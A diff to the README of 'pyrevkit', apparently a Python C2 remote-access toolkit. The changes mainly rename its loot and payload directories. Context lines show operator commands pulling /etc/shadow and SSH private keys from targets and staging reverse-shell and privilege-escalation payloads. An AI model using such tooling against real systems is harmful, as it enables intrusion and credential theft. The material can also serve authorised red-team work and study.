@@ -104,11 +104,11 @@ python pyrev_server.py
 
 Output:
 ```
-[+] Directories ready: Loot/, Payloads/
+[+] Directories ready: loot/, payloads/
 [+] Server running on wss://0.0.0.0:8765
 [+] Credentials file: credentials.json
-[+] Loot directory: Loot/
-[+] Payloads directory: Payloads/
+[+] Loot directory: loot/
+[+] Payloads directory: payloads/
 ```
 
 ### 3. Connect a Target
@@ -148,17 +148,18 @@ root
 ## 🏗️ Architecture
 
 ```
-┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
-│  Operator       │         │  C2 Server      │         │  Target         │
-│  (Client)       │◄───────►│                 │◄───────►│  (Agent)        │
-│                 │  WSS    │  - Auth         │  WSS    │                 │
-│  pyrev_client   │         │  - Relay        │         │  pyrev_target   │
-└─────────────────┘         │  - Files        │         └─────────────────┘
-                            └─────────────────┘
-                                   │
-                            ┌──────┴──────┐
-                            │             │
-                         Loot/       Payloads/
+┌─────────────────┐         ┌────────────────┐         ┌────────────────┐
+│     Operator    │         │   C2 Server    │         │     Target     │
+│                 │◄───────►│   - Auth       │◄───────►│                |
+│                 │  WSS    │   - Relay      │  WSS    │                │
+│  pyrev_client   │         │   - Files      │         │  pyrev_target  │
+└─────────────────┘         │                │         └────────────────┘
+                            |  pyrev_server  |
+                            └────────────────┘
+                                     │
+                              ┌──────┴──────┐
+                              │             │
+                            loot/       payloads/
 ```
 
 ### Components
@@ -177,8 +178,8 @@ pyrevkit/
 ├── requirements.txt         # Python dependencies
 ├── server.pem              # SSL certificate (generated)
 ├── credentials.json        # Hashed credentials (auto-created)
-├── Loot/                   # Downloaded files from targets
-└── Payloads/               # Files to upload to targets
+├── loot/                   # Downloaded files from targets
+└── payloads/               # Files to upload to targets
 ```
 
 ## 📖 Usage
@@ -330,7 +331,7 @@ python pyrev_client.py
 ```bash
 >>> download /etc/passwd
 [*] Requesting download: /etc/passwd
-[✓] Downloaded passwd (2.45 KB) → Loot/machineA_passwd
+[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
 ```
 
 **Features:**
@@ -347,20 +348,20 @@ python pyrev_client.py
 [✓] Saved exploit.sh (5.67 KB) → downloads/exploit.sh
 ```
 
-Files are uploaded from the server's `Payloads/` directory to the target's `downloads/` folder.
+Files are uploaded from the server's `payloads/` directory to the target's `downloads/` folder.
 
 #### List Files
 
 ```bash
 # List downloaded files (server-side)
 >>> ls_loot
-Files in Loot/:
+Files in loot/:
   - machineA_passwd (2.45 KB)
   - machineA_config.txt (1.23 KB)
 
 # List available payloads
 >>> ls_payloads
-Files in Payloads/:
+Files in payloads/:
   - exploit.sh (5.67 KB)
   - payload.exe (234.56 KB)
 ```
@@ -402,16 +403,16 @@ drwxr-xr-x 19 root root 4096 Mar 15 08:12 ..
 
 ```bash
 >>> download /etc/passwd
-[✓] Downloaded passwd (2.45 KB) → Loot/machineA_passwd
+[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
 
 >>> download /etc/shadow
-[✓] Downloaded shadow (1.89 KB) → Loot/machineA_shadow
+[✓] Downloaded shadow (1.89 KB) → loot/machineA_shadow
 
 >>> download /home/user/.ssh/id_rsa
-[✓] Downloaded id_rsa (3.24 KB) → Loot/machineA_id_rsa
+[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa
 
 >>> ls_loot
-Files in Loot/:
+Files in loot/:
   - machineA_passwd (2.45 KB)
   - machineA_shadow (1.89 KB)
   - machineA_id_rsa (3.24 KB)
@@ -421,7 +422,7 @@ Files in Loot/:
 
 ```bash
 >>> ls_payloads
-Files in Payloads/:
+Files in payloads/:
   - reverse_shell.sh (265 bytes)
   - privilege_escalation.py (3.21 KB)
 
@@ -471,8 +472,8 @@ $ python pyrev_client.py
 Edit `pyrev_server.py` constants:
 
 ```python
-LOOT_DIR = "Loot"           # Directory for downloaded files
-PAYLOADS_DIR = "Payloads"   # Directory for payloads to upload
+LOOT_DIR = "loot"           # Directory for downloaded files
+PAYLOADS_DIR = "payloads"   # Directory for payloads to upload
 CREDS_FILE = "credentials.json"
 ```
 
@@ -517,7 +518,7 @@ OP_ID = "operator1"  # Operator identifier
 
 ### Recommendations
 
-- Use strong, unique passwords (12+ characters)
+- Use strong, unique passwords (16+ characters)
 - Rotate credentials regularly
 - Use firewall rules to restrict server access
 - Monitor server logs for suspicious activity
@@ -570,8 +571,8 @@ python pyrev_server.py -creds target machineA NewPassword123
 # For download: verify file exists on target
 >>> ls /path/to/file
 
-# For upload: verify file in Payloads/
-ls -l Payloads/
+# For upload: verify file in payloads/
+ls -l payloads/
 ```
 
 **Problem**: `[✗] File too large`
